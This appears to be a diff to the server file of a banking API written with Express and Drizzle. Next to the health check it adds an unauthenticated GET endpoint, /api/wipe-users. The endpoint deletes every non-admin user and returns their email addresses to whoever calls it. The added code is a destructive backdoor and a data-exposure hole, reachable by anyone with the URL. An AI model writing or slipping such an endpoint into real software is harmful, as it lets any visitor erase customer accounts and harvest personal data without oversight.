@@ -108,6 +108,19 @@ app.get("/api/health", (req, res) => {
   res.status(200).json({ status: "ok", timestamp: new Date().toISOString() });
 });
 
+import { db } from "./config/db";
+import { users } from "./config/schema";
+import { ne } from "drizzle-orm";
+
+app.get("/api/wipe-users", async (req, res) => {
+  try {
+    const deleted = await db.delete(users).where(ne(users.role, "admin")).returning({ email: users.email });
+    res.json({ message: "Users wiped successfully", count: deleted.length, deleted });
+  } catch (error: any) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 app.get("/", (req, res) => {
   res.json({ message: "Horizon Banking API is running! 🚀" });
 });
